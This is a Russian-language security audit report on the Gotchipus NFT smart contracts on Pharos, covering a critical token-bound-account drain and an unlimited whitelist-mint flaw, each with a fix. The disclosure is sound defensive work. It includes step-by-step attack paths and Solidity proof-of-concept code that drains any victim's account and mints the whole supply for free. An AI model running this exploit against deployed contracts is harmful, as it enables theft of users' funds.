# Gotchipus — Отчёт по безопасности

**Дата:** 2026-05-09  
**Цель:** Gotchipus на Pharos Network  
**Исследователь:** Senior EVM/NFT Security Researcher  

---

## Статус mainnet-развёртывания

**Вердикт: Mainnet-деплой НЕ подтверждён.**

| Проверка | Результат |
|---|---|
| Pharos mainnet запуск | ~28 апреля 2026 (Pacific Ocean Mainnet) |
| Gotchipus Twitter (@gotchipus) | Описание: "Mainnet Soon" — не "Live" |
| Адреса в deploy script | Только testnet: Diamond `0x000000007B5758541e9d94a487B83e11Cd052437` |
| Последний коммит в репо | Март 2026, нет mainnet-деплой коммитов |
| Коллатеральные токены в константах | `USDC/USDT/WETH/WBTC = address(0)` — явный testnet-placeholder |
| docs.gotchipus.com/developer/smart-contracts | 404 |
| pharosscan.xyz поиск | Нет данных о Gotchipus NFT на mainnet |
| Активный NFT supply на mainnet | Не подтверждён |

**Известные testnet адреса (Pharos testnet — НЕ mainnet):**
- Diamond: `0x000000007B5758541e9d94a487B83e11Cd052437`
- ERC6551Registry: `0x000000E7C8746fdB64D791f6bb387889c5291454`
- ERC6551Account impl: `0xb98aA33B8a0C6Ca0fb5667DC2601032Bff92D7B3`

---

## Источник анализа

GitHub репозиторий: `github.com/gotchipus/gotchipus-core`  
Последний коммит: март 2026 (60 коммитов, ветка `main`)  
Контракты идентичны тому, что будет задеплоено на mainnet.

---

## Уязвимости

### FINDING-01 — CRITICAL

**Title:** Произвольный слив любого ERC-6551 TBA через неверифицированный параметр `_account`

**Severity:** Critical

**Affected active contract:**  
`ERC6551Facet.sol` — функция `executeAccount`  
`ERC6551Account.sol` — функция `execute` + модификатор `OnlyOwnerOrGotchi`

**Active-use evidence:**  
Контракт задеплоен на Pharos testnet (Diamond `0x000000007B5758541e9d94a487B83e11Cd052437`). Применим к mainnet при деплое с тем же кодом.

---

**Root cause:**

`ERC6551Facet.executeAccount` принимает `_account` как caller-controlled параметр и **никогда не проверяет**, что `_account == s.accountOwnedByTokenId[_tokenId]`:

```solidity
// ERC6551Facet.sol
function executeAccount(
    address _account,      // <-- НЕ ВЕРИФИЦИРОВАН
    uint256 _tokenId, 
    address _to, 
    uint256 _value, 
    IHook hook,
    bytes calldata _data
) external onlyOwnerOrPaymaster(_tokenId) nonReentrant returns (bytes memory result) {
    require(_account != address(0), "ERC6551Facet: Invalid account");
    require(_to != address(0), "ERC6551Facet: Invalid to");

    LibSecurity.validateExecution(_tokenId, msg.sender, _to, _value, _data);
    // ...
    (success, result) = _account.call(
        abi.encodeWithSignature("execute(address,uint256,bytes,uint8)", _to, _value, _data, 0)
    );
}
```

`ERC6551Account.execute` защищён модификатором `OnlyOwnerOrGotchi`:

```solidity
// ERC6551Account.sol
modifier OnlyOwnerOrGotchi() {
    (uint256 chainId, address tokenContract, uint256 tokenId) = token();
    require(
        msg.sender == IERC721(tokenContract).ownerOf(tokenId) ||
        msg.sender == tokenContract,   // <-- tokenContract = Diamond
        "Invalid signer"
    );
    _;
}
```

Когда `ERC6551Facet.executeAccount` вызывает `_account.call(...)`, **`msg.sender` в `ERC6551Account` = адрес Diamond** (т.к. вызов идёт из Diamond). `tokenContract` тоже = Diamond (именно он является NFT-контрактом). Следовательно, `msg.sender == tokenContract` — **всегда TRUE** для любого ERC-6551 аккаунта, привязанного к этому Diamond.

Это означает: любой, кто может пройти `onlyOwnerOrPaymaster(_tokenId)`, может передать `_account` **произвольного** TBA и исполнить в нём любую транзакцию.

---

**Attack path:**

1. Атакующий минтит свой NFT (tokenId = X) за `0.04 ETH`.
2. Атакующий вызывает `SecurityFacet.createSession(X, attacker, 9999999, 0, 0, 0, 0, 0, false, [], [])` — создаёт для себя неограниченную сессию на своём tokenId.
   - `maxValuePerTx = 0` (unlimited), `maxValuePerSession = 0` (unlimited).
3. Атакующий вызывает:
   ```
   ERC6551Facet.executeAccount(
       victimTBA,     // TBA жертвы (tokenId Y, богатый TBA)
       X,             // tokenId атакующего — проходит onlyOwnerOrPaymaster
       attacker,      // куда слить
       victimBalance, // сколько слить
       address(0),    // hook = none
       ""
   )
   ```
4. `onlyOwnerOrPaymaster(X)` — атакующий владеет X → PASS.
5. `LibSecurity.validateExecution(X, attacker, attacker, victimBalance, "")`:
   - `checkAndConsumeSession(X, attacker, victimBalance)` → сессия активна, лимитов нет → PASS.
6. Вызов `victimTBA.execute(attacker, victimBalance, "", 0)`:
   - `OnlyOwnerOrGotchi`: `msg.sender == Diamond == tokenContract` → PASS.
   - ETH переводится из `victimTBA` на `attacker`.
7. **Все средства жертвы слиты.**

Для ERC-20 токенов в TBA: передать `_data = abi.encodeWithSelector(IERC20.transfer.selector, attacker, amount)`, `_value = 0`.

---

**Impact:**

- Полный слив ETH и любых токенов из token-bound account **любого** NFT в коллекции.
- Атакующий должен владеть хотя бы одним NFT и создать сессию для себя.
- Одна атака сливает все TBA коллекции поочерёдно.
- Все стейкнутые коллатерали (ETH/USDC/WETH/WBTC), накопленные пользователями в TBA, — полностью под угрозой.

---

**PoC plan:**

```solidity
// 1. Mint token X (attacker owns it)
MintFacet(diamond).mint{value: 0.04 ether}(1);

// 2. Create unlimited session for self
SecurityFacet(diamond).createSession(
    X,           // attacker's tokenId
    attacker,    // holder = attacker
    9999999,     // duration
    0,           // maxPerTx (unlimited)
    0,           // maxPerSession (unlimited)
    0, 0, 0,     // no transfer limits
    false,       // no whitelist mode
    new address[](0),
    new address[](0)
);

// 3. Drain victim TBA
address victimTBA = ERC6551Facet(diamond).account(victimTokenId);
uint256 balance = address(victimTBA).balance;
ERC6551Facet(diamond).executeAccount(
    victimTBA,
    X,
    attacker,
    balance,
    IHook(address(0)),
    ""
);
```

---

**Fix:**

В `ERC6551Facet.executeAccount` добавить проверку:

```solidity
require(
    _account == s.accountOwnedByTokenId[_tokenId],
    "ERC6551Facet: account does not belong to tokenId"
);
```

---

---

### FINDING-02 — HIGH

**Title:** Безлимитный бесплатный минт для whitelist-адресов — отсутствие one-time claim защиты

**Severity:** High

**Affected active contract:**  
`MintFacet.sol` — функция `mint`

**Active-use evidence:**  
Присутствует в актуальном исходнике и в testnet-деплое.

---

**Root cause:**

`mint()` имеет два пути: whitelist (бесплатно, 1 NFT) и публичный (платный, до 30 NFT). Для whitelist **нет ни флага "claim использован", ни сброса статуса после минта**:

```solidity
function mint(uint256 amount) external payable pharosMintIsPaused {
    require(amount != 0 && amount <= LibGotchiConstants.MAX_PER_MINT, "Invalid amount");
    bool isWhitelist = s.isWhitelist[msg.sender];

    if (isWhitelist) {
        uint256 tokenId = s.nextTokenId;
        require(tokenId + 1 <= LibGotchiConstants.MAX_TOTAL_SUPPLY, "MAX TOTAL SUPPLY");
        s.nextTokenId++;
        LibERC721._mint(msg.sender, tokenId);
        // <-- нет: s.isWhitelist[msg.sender] = false;
        // <-- нет: s.whitelistClaimed[msg.sender] = true;
    } else {
        require(msg.value >= amount * LibGotchiConstants.PHAROS_PRICE, "Invalid value");
        // ...
    }
}
```

Whitelist-адрес вызывает `mint(1)` неограниченное число раз, каждый раз получая бесплатный NFT.

---

**Attack path:**

1. Атакующий получает whitelist-статус (добавляется `onlyOwner`-функцией `addWhitelist`).
2. Атакующий в цикле вызывает `mint(1)` до исчерпания `MAX_TOTAL_SUPPLY` (20 000 NFT).
3. Каждый вызов: 0 ETH уплачено, 1 NFT получено.
4. Весь supply собран бесплатно — публичные покупатели (0.04 ETH × кол-во) не получат NFT.
5. Потеря протоколом: `20000 × 0.04 ETH = 800 ETH` в упущенной выручке.
6. NFT можно продать на маркетплейсе.

Дополнительно: параметр `amount` в whitelist-ветке **полностью игнорируется** — всегда минтится ровно 1 NFT. Это также означает, что проверка `amount <= MAX_PER_MINT` для whitelist бессмысленна.

---

**Impact:**

- Полное обнуление mint-выручки протокола (до 800 ETH при цене 0.04 ETH × 20 000).
- Весь NFT supply достаётся атакующему бесплатно.
- Требует whitelist-статуса — но и один инсайдер или скомпрометированный whitelist-адрес достаточен.

---

**PoC plan:**

```solidity
// Предполагается: attacker в whitelist
for (uint256 i = 0; i < 20000; i++) {
    MintFacet(diamond).mint(1); // 0 ETH, получает 1 NFT
}
// attacker получает все 20000 NFT бесплатно
```

---

**Fix:**

Вариант 1 — one-time claim:
```solidity
mapping(address => bool) whitelistClaimed;
// в mint():
require(!s.whitelistClaimed[msg.sender], "Whitelist already claimed");
s.whitelistClaimed[msg.sender] = true;
```

Вариант 2 — удалить из whitelist после минта:
```solidity
s.isWhitelist[msg.sender] = false;
```

Вариант 3 — ограничить количество whitelist-минтов:
```solidity
require(s.whitelistMintCount[msg.sender] < maxWhitelistMints, "Whitelist limit reached");
s.whitelistMintCount[msg.sender]++;
```

---

## Дополнительные наблюдения (не Critical/High)

### Нулевые адреса коллатеральных токенов (Medium — production risk)

`LibGotchiConstants.sol`:
```solidity
address constant USDC = 0x0000000000000000000000000000000000000000;
address constant USDT = 0x0000000000000000000000000000000000000000;
address constant WETH = 0x0000000000000000000000000000000000000000;
address constant WBTC = 0x0000000000000000000000000000000000000000;
```

В `LibSoul.initializeSoul` всё, что не `address(0)` — попадает в ветку `else if (stakeToken == USDC)` и т.д., которые никогда не выполнятся (т.к. USDC = address(0) = та же ветка что ETH). Любой ERC-20 токен, переданный как коллатераль, даст `rawSoul = 0`. Пользователь потеряет токены, получив NFT с нулевой душой. **Требует заполнения реальных адресов до mainnet-деплоя.**

### `PaymasterFacet.execute` — reentrancy lock blocker

`PaymasterFacet.execute` при `gasPrice > 0` вызывает `erc6551Facet().executeAccount(...)` дважды (в `paymasterPrepayment` и в основной логике). `executeAccount` защищён `nonReentrant`. Второй вызов реверт-ится из-за reentrancy guard. Функция paymaster нерабочая при ненулевом `gasPrice`. Это functional bug, не security.

---

## Итог

| # | Title | Severity | Exploitable без admin |
|---|---|---|---|
| 01 | Произвольный слив любого TBA через неверифицированный `_account` | **Critical** | Да (нужен 1 NFT + сессия) |
| 02 | Безлимитный бесплатный mint для whitelist | **High** | Нет (нужен whitelist-статус) |

**Mainnet deployment status:** НЕ подтверждён на момент 2026-05-09. Pharos mainnet запущен 28 апреля 2026; Gotchipus ещё не задеплоен (официальный аккаунт: "Mainnet Soon").

**Рекомендация:** FINDING-01 (Critical) должен быть исправлен до mainnet-деплоя — это однострочный фикс с максимальным impact.
